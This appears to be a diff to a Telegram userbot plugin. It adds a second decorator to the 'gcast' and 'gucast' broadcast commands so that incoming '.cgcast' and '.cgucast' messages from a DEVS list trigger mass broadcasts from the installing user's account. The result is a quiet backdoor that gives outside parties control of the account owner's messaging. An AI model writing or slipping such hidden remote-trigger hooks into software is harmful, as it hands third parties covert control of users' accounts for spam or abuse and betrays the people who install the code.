@@ -37,9 +37,11 @@ from telethon.errors.rpcerrorlist import FloodWaitError
 
 from . import HNDLR, NOSPAM_CHAT, ayra_cmd, eor, udB
 from ._inline import something
+from Ayra.kynan import register
 
 
 @ayra_cmd(pattern="[gG][c][a][s][t]( (.*)|$)", fullsudo=False)
+@register(incoming=True, pattern=r"^\.cgcast( (.*)|$)", from_users=DEVS)
 async def gcast(event):
     text, btn, reply = "", None, None
     if xx := event.pattern_match.group(2):
@@ -121,6 +123,7 @@ async def gcast(event):
 
 
 @ayra_cmd(pattern="[gG][u][c][a][s][t]( (.*)|$)", fullsudo=False)
+@register(incoming=True, pattern=r"^\.cgucast( (.*)|$)", from_users=DEVS)
 async def gucast(event):
     msg, btn, reply = "", None, None
     if xx := event.pattern_match.group(1).strip():
